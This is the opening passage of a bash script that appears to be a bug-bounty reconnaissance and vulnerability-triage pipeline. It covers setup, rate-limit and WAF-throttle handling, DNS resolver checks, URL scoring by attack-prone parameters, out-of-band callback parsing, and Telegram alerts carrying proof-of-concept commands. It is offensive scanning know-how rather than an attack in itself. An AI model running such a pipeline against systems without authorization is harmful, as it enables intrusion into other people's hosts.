#!/usr/bin/env bash
# apex-recon.sh — Advanced authorized recon + vuln-triage pipeline
# ⚠️ Use ONLY on assets you own or have explicit written permission to test.

set -o pipefail
umask 077
# NOTE: IFS is intentionally left at its default. Read loops below set a local
# IFS where needed (e.g. `while IFS= read -r`). Setting IFS=$'\n\t' globally is a
# footgun across a 2000+ line script — any unquoted expansion that expects normal
# word-splitting can silently misbehave.

# Ensure any background helper process we start (e.g. interactsh-client) never
# leaks past this script's lifetime.
INTERACTSH_PID=""
_cleanup_bg() {
  if [[ -n "$INTERACTSH_PID" ]] && kill -0 "$INTERACTSH_PID" 2>/dev/null; then
    kill "$INTERACTSH_PID" 2>/dev/null || true
    wait "$INTERACTSH_PID" 2>/dev/null || true
  fi
}
trap _cleanup_bg EXIT INT TERM

# ---------------------------------------------------------------------------
# ---------------------------------------------------------------------------
# Doctor mode: `./apex-recon.sh --check` prints tool status (no target needed)
# ---------------------------------------------------------------------------
if [[ "${1:-}" == "--check" || "${1:-}" == "--doctor" || "${1:-}" == "doctor" ]]; then
  _h(){ command -v "$1" >/dev/null 2>&1; }
  echo; echo "apex-recon preflight (doctor)"
  echo "  CORE (required):"
  for t in subfinder dnsx httpx katana gau nuclei curl jq; do
    _h "$t" && echo "    [ ok ] $t" || echo "    [MISS] $t"
  done
  echo "  OPTIONAL (auto-skipped if absent):"
  for t in assetfinder amass github-subdomains chaos alterx puredns naabu interactsh-client waybackurls gf qsreplace unfurl jsluice subzy gowitness ffuf dalfox graphql-cop clairvoyance trufflehog S3Scanner s3scanner cloud_enum cloud-enum nmap anew ghauri sqlmap crlfuzz websocat ncat bc timeout arjun git-dumper; do
    _h "$t" && echo "    [ ok ] $t" || echo "    [ -- ] $t"
  done
  echo; echo "Missing CORE? run ./setup.sh (or use Docker). Optional missing = auto-skipped."
  exit 0
fi

# Config
# ---------------------------------------------------------------------------
TARGET="${1:?Usage: $0 <authorized-domain|--targets file.txt> [--full] [--quick] [--resume] [--diff prev_dir] [--active-brute]}"
shift || true
MODE="safe"; ACTIVE_BRUTE="false"; QUICK_MODE="false"; RESUME_MODE="false"; DIFF_DIR=""
SCOPE_FILE="${SCOPE_FILE:-}"
AUTH_URLS_FILE="${AUTH_URLS_FILE:-}"
TARGETS_FILE=""

# Guard: if the first argument is a flag, the user forgot the target/domain.
# Without this they'd hit a confusing "invalid domain" error further down.
if [[ "$TARGET" == --* && "$TARGET" != "--targets" ]]; then
  printf '[x] Missing target. First argument must be a domain or "--targets file.txt", not a flag (%s).\n' "$TARGET" >&2
  printf '    Example: %s example.com --full\n' "$0" >&2
  exit 1
fi

if [[ "$TARGET" == "--targets" ]]; then
  TARGETS_FILE="${1:?Missing targets file}"
  shift || true
fi

SAFE_PROFILE="false"
while [[ $# -gt 0 ]]; do
  case "$1" in
    --full)         MODE="full" ;;
    --quick)        QUICK_MODE="true" ;;
    --resume)       RESUME_MODE="true" ;;
    --safe)         SAFE_PROFILE="true" ;;
    --diff)         shift; DIFF_DIR="${1:-}" ;;
    --active-brute) ACTIVE_BRUTE="true" ;;
  esac
  shift || true
done

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"

# If multi-target file provided, process sequentially
if [[ -n "$TARGETS_FILE" && -f "$TARGETS_FILE" ]]; then
  printf "[+] Processing multi-target scan file: %s\n" "$TARGETS_FILE"
  while IFS= read -r single_target || [[ -n "$single_target" ]]; do
    single_target="$(echo "$single_target" | tr -d '\r\n ')"
    [[ -z "$single_target" || "$single_target" =~ ^# ]] && continue
    printf "\n=======================================================\n"
    printf "[+] Starting target: %s\n" "$single_target"
    printf "=======================================================\n"
    args=("$single_target")
    [[ "$MODE" == "full" ]] && args+=("--full")
    [[ "$QUICK_MODE" == "true" ]] && args+=("--quick")
    [[ "$SAFE_PROFILE" == "true" ]] && args+=("--safe")
    [[ "$ACTIVE_BRUTE" == "true" ]] && args+=("--active-brute")
    "$0" "${args[@]}" || true
  done < "$TARGETS_FILE"
  exit 0
fi

# Single target validation
TARGET="${TARGET,,}"
TARGET="${TARGET%.}"
[[ "$TARGET" =~ ^[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?(\.[a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?)+$ ]] \
  || { printf '[x] Target must be a valid domain name (for example: example.com)\n' >&2; exit 1; }

# Resume support: re-use latest output dir if --resume passed
if [[ "$RESUME_MODE" == "true" ]]; then
  LATEST_DIR="$(ls -td recon_${TARGET}_* 2>/dev/null | head -1)"
  if [[ -n "$LATEST_DIR" && -d "$LATEST_DIR" ]]; then
    OUT="$LATEST_DIR"
    STAMP="${OUT#recon_${TARGET}_}"
    printf '[+] Resuming previous scan in: %s\n' "$OUT"
  else
    STAMP="$(date -u +%Y%m%dT%H%M%SZ)"
    OUT="recon_${TARGET}_${STAMP}"
  fi
else
  STAMP="$(date -u +%Y%m%dT%H%M%SZ)"
  OUT="recon_${TARGET}_${STAMP}"
fi

if [[ "$SAFE_PROFILE" == "true" ]]; then
  RATE_LIMIT=20
  RATE_LIMIT_MAX=20
  CONCURRENCY=5
  HTTPX_THREADS=10
  NUCLEI_RATE_LIMIT=15
  NUCLEI_RATE_LIMIT_MAX=15
  FFUF_RATE=5
  FFUF_RATE_MAX=5
  FFUF_THREADS=3
  KATANA_RATE_LIMIT=5
  KATANA_RATE_LIMIT_MAX=5
  KATANA_DELAY=2
  printf '[!] SAFE PROFILE ENABLED: Rate limits set to conservative low values.\n'
else
  RATE_LIMIT="${RATE_LIMIT:-150}"
  RATE_LIMIT_MAX="${RATE_LIMIT_MAX:-150}"
  CONCURRENCY="${CONCURRENCY:-25}"
  HTTPX_THREADS="${HTTPX_THREADS:-50}"
  NUCLEI_RATE_LIMIT="${NUCLEI_RATE_LIMIT:-50}"
  NUCLEI_RATE_LIMIT_MAX="${NUCLEI_RATE_LIMIT_MAX:-50}"
  FFUF_RATE="${FFUF_RATE:-5}"
  FFUF_RATE_MAX="${FFUF_RATE_MAX:-15}"
  FFUF_THREADS="${FFUF_THREADS:-5}"
  KATANA_RATE_LIMIT="${KATANA_RATE_LIMIT:-10}"
  KATANA_RATE_LIMIT_MAX="${KATANA_RATE_LIMIT_MAX:-20}"
  KATANA_DELAY="${KATANA_DELAY:-1}"
fi

# --- Per-Host Rate Limit Helper ---
get_host_rate_limit() {
  local target_host="$1"
  if grep -qiE '(admin|auth|login|api|sso|gateway|secure)\.' <<< "$target_host"; then
    echo 15 # Lower rate limit for sensitive/admin hosts
  else
    echo "${RATE_LIMIT:-150}"
  fi
}

# --- Adaptive Rate Limit Recovery & Backoff Mechanism ---
LAST_THROTTLE_TIME=$SECONDS
LAST_RECOVERY_CHECK=$SECONDS

exponential_backoff() {
  local retry_count="${1:-1}"
  local sleep_times=(5 15 30 60)
  local idx=$((retry_count - 1))
  [[ $idx -gt 3 ]] && idx=3
  local delay="${sleep_times[$idx]}"
  warn "⚠️ Throttling / 429 / 503 detected! Applying exponential backoff sleep (${delay}s)..."
  sleep "$delay"
}

recover_rate_limit_if_clean() {
  # If 30 minutes (1800s) have passed without throttling, recover ALL scanner tool rates proportionally
  if (( SECONDS - LAST_THROTTLE_TIME >= 1800 )) && (( SECONDS - LAST_RECOVERY_CHECK >= 1800 )); then
    if (( RATE_LIMIT < RATE_LIMIT_MAX )); then
      RATE_LIMIT=$(( RATE_LIMIT + 10 ))
      [[ $RATE_LIMIT -gt $RATE_LIMIT_MAX ]] && RATE_LIMIT=$RATE_LIMIT_MAX

      NUCLEI_RATE_LIMIT=$(( NUCLEI_RATE_LIMIT + 5 ))
      [[ $NUCLEI_RATE_LIMIT -gt $NUCLEI_RATE_LIMIT_MAX ]] && NUCLEI_RATE_LIMIT=$NUCLEI_RATE_LIMIT_MAX

      FFUF_RATE=$(( FFUF_RATE + 2 ))
      [[ $FFUF_RATE -gt $FFUF_RATE_MAX ]] && FFUF_RATE=$FFUF_RATE_MAX

      KATANA_RATE_LIMIT=$(( KATANA_RATE_LIMIT + 2 ))
      [[ $KATANA_RATE_LIMIT -gt $KATANA_RATE_LIMIT_MAX ]] && KATANA_RATE_LIMIT=$KATANA_RATE_LIMIT_MAX

      log "📈 Adaptive Recovery: 30m clean run verified. Recovered tool rates: RATE_LIMIT=${RATE_LIMIT}/s | NUCLEI=${NUCLEI_RATE_LIMIT}/s | FFUF=${FFUF_RATE}/s | KATANA=${KATANA_RATE_LIMIT}/s"
    fi
    LAST_RECOVERY_CHECK=$SECONDS
  fi
}

HTTP_TIMEOUT="${HTTP_TIMEOUT:-20}"
HTTP_CONNECT_TIMEOUT="${HTTP_CONNECT_TIMEOUT:-10}"
SWAGGER_TIMEOUT="${SWAGGER_TIMEOUT:-25}"
BUCKET_TIMEOUT="${BUCKET_TIMEOUT:-20}"
NUCLEI_CONCURRENCY="${NUCLEI_CONCURRENCY:-$CONCURRENCY}"
NUCLEI_BULK_SIZE="${NUCLEI_BULK_SIZE:-50}"
NUCLEI_TIMEOUT="${NUCLEI_TIMEOUT:-20}"
NUCLEI_RETRIES="${NUCLEI_RETRIES:-2}"
NUCLEI_PROFILE="${NUCLEI_PROFILE:-balanced}"
NUCLEI_SEVERITIES="${NUCLEI_SEVERITIES:-low,medium,high,critical}"
MAX_ACTIVE_URLS="${MAX_ACTIVE_URLS:-800}"
UPDATE_NUCLEI_TEMPLATES="${UPDATE_NUCLEI_TEMPLATES:-false}"
CUSTOM_NUCLEI_TEMPLATES="${CUSTOM_NUCLEI_TEMPLATES:-$SCRIPT_DIR/nuclei-templates/custom}"
JWT_WORDLIST="${JWT_WORDLIST:-$HOME/bugbounty/wordlists/jwt/common-secrets.txt}"
START_TIME=$SECONDS

[[ "$NUCLEI_PROFILE" == "balanced" || "$NUCLEI_PROFILE" == "full" ]] \
  || { printf '[x] NUCLEI_PROFILE must be balanced or full\n' >&2; exit 1; }
RESOLVERS="${RESOLVERS:-$OUT/resolvers.txt}"
WORDLIST_DNS="${WORDLIST_DNS:-$HOME/bugbounty/wordlists/dns/best-dns-wordlist.txt}"
WORDLIST_CONTENT="${WORDLIST_CONTENT:-$HOME/bugbounty/wordlists/content/raft-medium-directories.txt}"

TELEGRAM_BOT_TOKEN="${TELEGRAM_BOT_TOKEN:-}"
TELEGRAM_CHAT_ID="${TELEGRAM_CHAT_ID:-}"

# Authenticated scanning (optional)
AUTH_COOKIE="${AUTH_COOKIE:-}"
AUTH_HEADER="${AUTH_HEADER:-}"
AUTH_HEADER2="${AUTH_HEADER2:-}"

# Interactsh / OOB
INTERACTSH_SERVER="${INTERACTSH_SERVER:-oast.pro}"
OOB_DOMAIN=""
OOB_SETUP_TIMEOUT="${OOB_SETUP_TIMEOUT:-45}"
OOB_STATUS="not started"

mkdir -p "$OUT"/{subs,dns,http,ports,urls,params,js,content,screens,oob,graphql,takeover,csp,vulns,auth,logs,cors,redirect,sqli,ssti,lfi,crlf,host-header,403bypass,burp,validation,headers,buckets,proto-pollution,jwt,cache,race,smuggling,ws,nextjs,ai}

# --- Disk Safety Watchdog Function ---
check_disk_space() {
  local min_free_mb="${1:-1500}"
  local free_mb
  if have df; then
    free_mb=$(df -m . 2>/dev/null | awk 'NR==2 {print $4}')
    if [[ -n "$free_mb" && "$free_mb" -lt "$min_free_mb" ]]; then
      warn "⚠️ LOW DISK SPACE WARNING: Only ${free_mb}MB free (Minimum required: ${min_free_mb}MB)"
      warn "  ↳ Emergency cleaning /tmp logs and pruning old screens..."
      rm -rf /tmp/dalfox_* /tmp/ffuf_* /tmp/nuclei_* /tmp/httpx_* 2>/dev/null || true
      find "$OUT/logs" -type f -name "*.tmp" -delete 2>/dev/null || true
      find "$OUT/screens" -type f -name "*.png" -delete 2>/dev/null || true
      find "$OUT/logs" -type f -size +10M -exec truncate -s 1M {} + 2>/dev/null || true
    fi
  fi
}
check_disk_space 1500

# Header args for downstream tools
HDR_ARGS=(); CURL_HDR=()
[[ -n "$AUTH_HEADER"  ]] && { HDR_ARGS+=(-H "$AUTH_HEADER");  CURL_HDR+=(-H "$AUTH_HEADER"); }
[[ -n "$AUTH_HEADER2" ]] && { HDR_ARGS+=(-H "$AUTH_HEADER2"); CURL_HDR+=(-H "$AUTH_HEADER2"); }
[[ -n "$AUTH_COOKIE"  ]] && { HDR_ARGS+=(-H "Cookie: $AUTH_COOKIE"); CURL_HDR+=(-H "Cookie: $AUTH_COOKIE"); }
# xargs-launched probes construct their own argument array from these values;
# exporting preserves spaces in header values and avoids unsafe string eval.
export AUTH_HEADER AUTH_HEADER2 AUTH_COOKIE HTTP_TIMEOUT

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
log()  { printf '\033[1;32m[+]\033[0m %s\n' "$*" | tee -a "$OUT/logs/run.log"; }
warn() { printf '\033[1;33m[!]\033[0m %s\n' "$*" | tee -a "$OUT/logs/run.log" >&2; }
die()  { printf '\033[1;31m[x]\033[0m %s\n' "$*" >&2; _notify_failure "$*"; exit 1; }
have() { command -v "$1" >/dev/null 2>&1; }
need() { have "$1" || die "Missing required tool: $1"; }
count(){ [[ -f "$1" ]] && awk 'END{print NR}' "$1" || echo 0; }

# Return the generated interactsh payload hostname from a client log.  Do not
# trust arbitrary dotted strings in the log (for example the client's version
# banner "1.3.1", or the vendor URL "projectdiscovery.io") as an OOB domain.
# A real interactsh payload is a long (~33-char) all-alphanumeric label followed
# by the configured server suffix, e.g. d9k4kfrlf3d4avnbef5g56kzbz16j8jc3.oast.pro
extract_oob_domain() {
  local log_file="$1" srv_re d
  srv_re="$(printf '%s' "$INTERACTSH_SERVER" | sed 's/[.[\*^$()+?{|]/\\&/g')"
  # 1) Preferred: a >=20-char random label anchored to the interactsh server.
  #    Anchoring means the banner "projectdiscovery.io" can never be matched.
  d="$(grep -oiE "[a-z0-9]{20,}\.${srv_re}" "$log_file" 2>/dev/null | head -n 1 || true)"
  # 2) Fallback (server-agnostic): a >=20-char random label + any domain. The
  #    length gate alone rejects "projectdiscovery" (16 chars) and "1.3.1".
  [[ -z "$d" ]] && d="$(grep -oiE '[a-z0-9]{20,}\.[a-z0-9.-]+' "$log_file" 2>/dev/null | head -n 1 || true)"
  d="${d,,}"; d="${d%.}"
  [[ -n "$d" ]] && { printf '%s\n' "$d"; return 0; }
  return 1
}

# ---------------------------------------------------------------------------
# Progress heartbeat — so long/active stages visibly show they are alive
# (answers "is it hung or just working?"). Usage:
#   progress_init "Stage 17 XSS" "$total"
#   ... loop ...  progress_tick
#   progress_done
# Prints an updating counter to the log every PROGRESS_EVERY items (default 25).
# ---------------------------------------------------------------------------
PROGRESS_EVERY="${PROGRESS_EVERY:-25}"
_PROG_LABEL=""; _PROG_TOTAL=0; _PROG_DONE=0
progress_init() {
  _PROG_LABEL="$1"; _PROG_TOTAL="${2:-0}"; _PROG_DONE=0
  log "▶ ${_PROG_LABEL} started (${_PROG_TOTAL} target(s))"
}
progress_tick() {
  _PROG_DONE=$(( _PROG_DONE + 1 ))
  if (( _PROG_DONE % PROGRESS_EVERY == 0 )); then
    if (( _PROG_TOTAL > 0 )); then
      printf '\033[1;36m[..]\033[0m %s: %d/%d processed…\n' \
        "$_PROG_LABEL" "$_PROG_DONE" "$_PROG_TOTAL" | tee -a "$OUT/logs/run.log"
    else
      printf '\033[1;36m[..]\033[0m %s: %d processed…\n' \
        "$_PROG_LABEL" "$_PROG_DONE" | tee -a "$OUT/logs/run.log"
    fi
  fi
}
progress_done() {
  log "✔ ${_PROG_LABEL} done (${_PROG_DONE} processed)"
  _PROG_LABEL=""; _PROG_TOTAL=0; _PROG_DONE=0
}

# Checkpoint system for resuming scans
set_checkpoint() {
  echo "$1" > "$OUT/checkpoint.txt"
}

# Storage saver: delete regenerable scratch/intermediate files once the stage
# that produced them is done. On Termux (often 4 parallel scans) these pre-dedup
# dumps and payload-permutation lists eat a lot of disk. Only ever called on
# NON-evidence files — findings, vulnerable.txt, screenshots, dumped source and
# secrets are never touched. Set KEEP_TMP=1 to keep everything for debugging.
# Resume-safe: these files are rebuilt if a stage re-runs, and no later stage
# reads them once their producing stage has checkpointed.
prune_paths() {
  [[ "${KEEP_TMP:-0}" == "1" ]] && return 0
  local p freed=0 sz
  for p in "$@"; do
    [[ -e "$p" ]] || continue
    sz=$(du -sk "$p" 2>/dev/null | awk '{print $1}'); freed=$((freed + ${sz:-0}))
    rm -rf "$p" 2>/dev/null || true
  done
  [[ "$freed" -gt 0 ]] && log "  ↳ storage saver: freed ~$((freed/1024)) MB of scratch ($#  paths)"
  return 0
}

# ---------------------------------------------------------------------------
# DNS Resolver Pool Selection Engine
# ---------------------------------------------------------------------------
select_working_resolver() {
  local primary_resolvers="${1:-$RESOLVERS}"
  local out_dir="${2:-$OUT/takeover}"
  mkdir -p "$out_dir"

  have dnsx || { echo ""; return 0; }

  local health_targets; health_targets="$(printf "example.com\ncloudflare.com\ngoogle.com\n")"
  local exec_prefix=""
  have timeout && exec_prefix="timeout --kill-after=10s 10s"

  # 1. Test PRIMARY Resolvers
  if [[ -n "$primary_resolvers" && -s "$primary_resolvers" ]]; then
    if $exec_prefix dnsx -l <(echo "$health_targets") -r "$primary_resolvers" -silent >/dev/null 2>&1; then
      log "  ↳ DNS Health Check: PRIMARY resolver pool active ($primary_resolvers)"
      echo "$primary_resolvers"
      return 0
    fi
    warn "⚠️ Primary resolvers ($primary_resolvers) failed health check! Testing PUBLIC backup pool..."
  fi

  # 2. Test PUBLIC Resolvers (Deduplicated & Sorted)
  local pub_res="$out_dir/public_resolvers.txt"
  printf "1.1.1.1\n8.8.8.8\n9.9.9.9\n8.8.4.4\n1.0.0.1\n" | sort -u > "$pub_res"
  if $exec_prefix dnsx -l <(echo "$health_targets") -r "$pub_res" -silent >/dev/null 2>&1; then
    log "  ↳ DNS Health Check: PUBLIC backup resolver pool active"
    echo "$pub_res"
    return 0
  fi
  warn "⚠️ Public resolvers failed health check! Testing SYSTEM default resolvers..."

  # 3. Test SYSTEM Resolvers
  if $exec_prefix dnsx -l <(echo "$health_targets") -silent >/dev/null 2>&1; then
    log "  ↳ DNS Health Check: SYSTEM default resolvers active"
    echo ""
    return 0
  fi

  warn "❌ All DNS resolver pools (PRIMARY, PUBLIC, SYSTEM) failed health check!"
  echo "FAILED"
  return 1
}

# ---------------------------------------------------------------------------
# Rate Limit & WAF Protection Engine
# ---------------------------------------------------------------------------
check_auto_rate_limit() {
  local check_file="${1:-$OUT/http/httpx.jsonl}"
  [[ -s "$check_file" ]] || return 0

  local c429; c429=$(grep -ciE '"status_code":(429|503|522|524)|429 Too Many Requests|503 Service|522 Origin|524 Timeout' "$check_file" 2>/dev/null || echo 0)
  if [[ "$c429" -gt 15 ]]; then
    warn "⚠️ Rate limit spike detected (${c429} 429/503 responses)! Throttling scanner rates..."
    LAST_THROTTLE_TIME=$SECONDS
    exponential_backoff 2
    RATE_LIMIT=$(( RATE_LIMIT / 2 ))
    NUCLEI_RATE_LIMIT=$(( NUCLEI_RATE_LIMIT / 2 ))
    KATANA_RATE_LIMIT=$(( KATANA_RATE_LIMIT / 2 ))
    FFUF_RATE=$(( FFUF_RATE / 2 ))
    [[ "$RATE_LIMIT" -lt 5 ]] && RATE_LIMIT=5
    [[ "$NUCLEI_RATE_LIMIT" -lt 5 ]] && NUCLEI_RATE_LIMIT=5
    [[ "$KATANA_RATE_LIMIT" -lt 2 ]] && KATANA_RATE_LIMIT=2
    [[ "$FFUF_RATE" -lt 2 ]] && FFUF_RATE=2

    log "  ↳ Throttled rates: RATE_LIMIT=${RATE_LIMIT}, NUCLEI=${NUCLEI_RATE_LIMIT}, FFUF=${FFUF_RATE}"
    log "  ↳ Sleeping 45s for WAF cooldown..."
    sleep 45
  fi
}

apply_jitter() {
  local max_sec="${1:-3}"
  local j; j=$(( RANDOM % max_sec + 1 ))
  sleep "$j"
}

exponential_backoff_retry() {
  local cmd="$1" retries="${2:-3}" delay=5 ec=0
  for (( i=1; i<=retries; i++ )); do
    eval "$cmd" && return 0 || ec=$?
    warn "Attempt $i failed (code $ec). Retrying in ${delay}s..."
    sleep "$delay"
    delay=$(( delay * 2 ))
  done
  return "$ec"
}

_get_host_rate_limit() {
  local host="$1"
  if [[ "$host" =~ ^(api|auth|admin|login|idp)\. ]]; then
    echo "15 5" # LOW RATE: limit 15, concurrency 5
  elif [[ "$host" =~ ^(cdn|static|assets|media|images)\. ]]; then
    echo "100 20" # HIGH RATE: limit 100, concurrency 20
  else
    echo "${RATE_LIMIT} ${CONCURRENCY}"
  fi
}

run_host_batched_scan() {
  local target_file="$1" batch_cmd_template="$2" batch_size="${3:-100}"
  [[ -s "$target_file" ]] || return 0

  local tmp_dir; tmp_dir="$(mktemp -d)"
  split -l "$batch_size" "$target_file" "$tmp_dir/batch_"

  for bfile in "$tmp_dir"/batch_*; do
    [[ -f "$bfile" ]] || continue
    local exec_cmd; exec_cmd=$(echo "$batch_cmd_template" | sed "s|__TARGET_FILE__|$bfile|g")
    eval "$exec_cmd" || true
    check_auto_rate_limit
    apply_jitter 2
  done
  rm -rf "$tmp_dir" 2>/dev/null || true
}

is_step_done() {
  local step_num="$1"
  if [[ "$RESUME_MODE" == "true" && -f "$OUT/checkpoint.txt" ]]; then
    local last_step; last_step=$(cat "$OUT/checkpoint.txt")
    if [[ "$last_step" -ge "$step_num" ]]; then
      log "Step $step_num already completed (checkpoint resume) — skipping"
      return 0
    fi
  fi
  return 1
}

# Calculate elapsed time string (TOTAL wall-clock time since the scan started).
# NOTE: on phones/Termux this counts real time even while the device is asleep,
# so a big number usually means the device slept or an earlier stage hung — it is
# the cumulative total for the whole run, NOT the time this one step took.
# Formatted human-readably: shows hours only when the run is long (>= 1h).
get_elapsed() {
  local elapsed=$((SECONDS - START_TIME))
  (( elapsed < 0 )) && elapsed=0
  local hrs=$((elapsed / 3600))
  local mins=$(((elapsed % 3600) / 60))
  local secs=$((elapsed % 60))
  if (( hrs > 0 )); then
    printf '%dh %dm %ds' "$hrs" "$mins" "$secs"
  else
    printf '%dm %ds' "$mins" "$secs"
  fi
}

# Preserve distinct paths/query strings, but remove fragments and exact repeats.
# Reordering query parameters is intentionally avoided because it can change
# application behavior and create false assumptions during reproduction.
dedupe_urls() { sed -E 's/\r$//; s/#.*$//' | awk 'NF && !seen[$0]++'; }

# Smart Priority Scoring Engine for mined URLs
score_urls() {
  local input_file="$1" output_file="$2"
  [[ -s "$input_file" ]] || return 0
  
  awk '
  {
    url = $0
    score = 0
    
    # Critical High-Value Endpoints (+10)
    if (url ~ /\/(admin|administrator|manage|management|dashboard|internal|backend|superuser)(\/|\?|$)/) score += 10
    if (url ~ /\/(graphql|graphiql|gql|v1\/graphql)(\/|\?|$)/) score += 10
    
    # High-Value Endpoints (+8 to +9)
    if (url ~ /\/(upload|file|import|export|attachment|media\/upload)(\/|\?|$)/) score += 9
    if (url ~ /\/(api|v1|v2|v3|v4|rest|grpc|service)(\/|\?|$)/) score += 8
    if (url ~ /[?&](redirect|url|dest|destination|next|target|checkout|return|to)=/) score += 8
    if (url ~ /[?&](cmd|exec|command|ping|code|eval|system|payload)=/) score += 9
    if (url ~ /[?&](file|path|doc|folder|root|include|read)=/) score += 8
    if (url ~ /[?&](id|user|account|order|email|key|token|jwt)=/) score += 7

    # Authentication & Session (+7)
    if (url ~ /\/(login|auth|oauth|session|token|register|signup|forgot|password)(\/|\?|$)/) score += 7

    print score "\t" url
  }' "$input_file" | sort -rn -k1,1 | cut -f2- > "$output_file"
}

telegram() {
  [[ -n "$TELEGRAM_BOT_TOKEN" && -n "$TELEGRAM_CHAT_ID" ]] || return 0
  local text="$1" mode="${2:-}"
  local args=(--data-urlencode "chat_id=${TELEGRAM_CHAT_ID}"
              --data-urlencode "text=${text}"
              --data-urlencode "disable_web_page_preview=true")
  # Optional parse_mode (e.g. HTML). Callers that pass plain text (all the
  # step banners) omit it, so those keep working exactly as before — no risk
  # of an unescaped '&' in a stage title breaking the message.
  [[ -n "$mode" ]] && args+=(--data-urlencode "parse_mode=${mode}")
  curl -fsS --retry 3 --connect-timeout 10 --max-time 30 \
    "${args[@]}" \
    "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
    >/dev/null || warn "Telegram notification failed"
}

# Escape the 3 chars Telegram's HTML parse_mode cares about. Used for every
# dynamic value (URLs, payloads) injected into an HTML-formatted message.
hesc() { local s="$*"; s="${s//&/&amp;}"; s="${s//</&lt;}"; s="${s//>/&gt;}"; printf '%s' "$s"; }

telegram_doc() {
  local doc_path="$1" caption="$2"
  [[ -n "$TELEGRAM_BOT_TOKEN" && -n "$TELEGRAM_CHAT_ID" && -f "$doc_path" ]] || return 0
  curl -fsS --retry 3 --connect-timeout 10 --max-time 60 \
    -F "chat_id=${TELEGRAM_CHAT_ID}" \
    -F "document=@${doc_path}" \
    -F "caption=${caption}" \
    "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument" \
    >/dev/null || warn "Telegram document sending failed"
}

# Send a directory of images to Telegram as albums (media groups, up to 10 each)
# so they arrive together. Returns 0 ONLY if at least one image was actually
# delivered — callers rely on this before deleting the local copies, so a missing
# token / no images / failed send must return non-zero to avoid losing the only copy.
telegram_photos() {
  local dir="$1" caption="${2:-}"
  [[ -n "$TELEGRAM_BOT_TOKEN" && -n "$TELEGRAM_CHAT_ID" && -d "$dir" ]] || return 1
  local imgs=() f
  for f in "$dir"/*.png "$dir"/*.jpg "$dir"/*.jpeg; do
    [[ -f "$f" ]] && imgs+=("$f")
  done
  local total=${#imgs[@]}
  [[ "$total" -eq 0 ]] && return 1
  local api="https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}" i=0 sent=0
  while [[ "$i" -lt "$total" ]]; do
    local batch=("${imgs[@]:i:10}") n; n=${#batch[@]}
    if [[ "$n" -eq 1 ]]; then
      curl -fsS --retry 2 --connect-timeout 10 --max-time 120 \
        -F "chat_id=${TELEGRAM_CHAT_ID}" -F "photo=@${batch[0]}" \
        -F "caption=${caption:-$(basename "${batch[0]}")}" \
        "$api/sendPhoto" >/dev/null \
        && sent=$((sent+1)) \
        || { warn "Screenshot send failed: ${batch[0]}"; telegram_doc "${batch[0]}" "$(basename "${batch[0]}")" && sent=$((sent+1)); }
    else
      # Build the media JSON array + one -F attachment per file (attach://pN)
      local media="[" fargs=() j=0 cap_esc
      for f in "${batch[@]}"; do
        [[ "$j" -gt 0 ]] && media+=","
        media+="{\"type\":\"photo\",\"media\":\"attach://p${j}\""
        if [[ "$j" -eq 0 && -n "$caption" ]]; then
          cap_esc="$(printf '%s' "$caption" | sed 's/\\/\\\\/g; s/"/\\"/g')"
          media+=",\"caption\":\"${cap_esc}\""
        fi
        media+="}"
        fargs+=(-F "p${j}=@${f}")
        j=$((j+1))
      done
      media+="]"
      if curl -fsS --retry 2 --connect-timeout 10 --max-time 180 \
           -F "chat_id=${TELEGRAM_CHAT_ID}" -F "media=${media}" "${fargs[@]}" \
           "$api/sendMediaGroup" >/dev/null; then
        sent=$((sent+n))
      else
        # A single bad/oversized image fails the whole album — retry per-file.
        warn "Album batch failed — sending screenshots individually"
        for f in "${batch[@]}"; do
          curl -fsS --retry 2 --connect-timeout 10 --max-time 120 \
            -F "chat_id=${TELEGRAM_CHAT_ID}" -F "photo=@${f}" -F "caption=$(basename "$f")" \
            "$api/sendPhoto" >/dev/null \
            && sent=$((sent+1)) \
            || { telegram_doc "$f" "$(basename "$f")" && sent=$((sent+1)); }
        done
      fi
    fi
    i=$((i+10))
    sleep 1   # gentle pacing so Telegram doesn't 429 between albums
  done
  log "  ↳ sent $sent/$total screenshots to Telegram"
  [[ "$sent" -gt 0 ]]
}

on_error() { telegram "❌ apex-recon failed on ${TARGET} @ line $1"; }
# Called by die(). Guarded so it is a no-op if telegram() isn't defined yet
# (e.g. very early arg-parsing failures) or if Telegram isn't configured.
_notify_failure() {
  declare -F telegram >/dev/null 2>&1 || return 0
  telegram "❌ apex-recon failed on ${TARGET:-<unset>}: $1"
}
# NOTE: no ERR/errexit trap -- stages may fail benignly; each stage guards itself.
# Fatal failures go through die(), which calls _notify_failure() above.

# Instant alert with Bug Bounty Reproduction Steps & PoC command
notify_alert() {
  local type="$1" url="$2" extra="${3:-N/A}" poc_cmd="${4:-}"
  local auth_note=""
  [[ -n "$AUTH_COOKIE$AUTH_HEADER$AUTH_HEADER2" ]] && auth_note='
🔑 <i>Use your locally configured authorized auth headers.</i>'

  local e_type e_url e_extra e_target e_poc
  e_type="$(hesc "$type")"; e_url="$(hesc "$url")"
  e_extra="$(hesc "$extra")"; e_target="$(hesc "$TARGET")"
  if [[ -n "$poc_cmd" ]]; then
    e_poc="$(hesc "$poc_cmd")"
  else
    e_poc="curl -i -s \"${url}\""
  fi

  telegram "🚨 <b>REAL-TIME VULN ALERT</b>
━━━━━━━━━━━━━━━━━━━━━━
🎯 <b>Target:</b> <code>${e_target}</code>
💥 <b>Type:</b> ${e_type}
🔗 <b>URL:</b> <code>${e_url}</code>
📝 <b>Evidence:</b> ${e_extra}

📌 <b>Reproduce PoC</b>
<pre>${e_poc}</pre>
Confirm the response demonstrates <b>${e_type}</b>.${auth_note}

⏰ <i>$(date -u +%H:%M:%SZ)</i>" "HTML"
}

# Confidence-aware Telegram Alerting for findings (Low / Medium / High / Confirmed)
notify_confidence_alert() {
  local confidence="$1" type="$2" url="$3" reason="${4:-N/A}" poc_cmd="${5:-}"
  local auth_note=""
  [[ -n "$AUTH_COOKIE$AUTH_HEADER$AUTH_HEADER2" ]] && auth_note='
🔑 <i>Use your locally configured authorized auth headers.</i>'

  local e_conf e_type e_url e_reason e_target e_poc
  e_conf="$(hesc "$confidence")"; e_type="$(hesc "$type")"
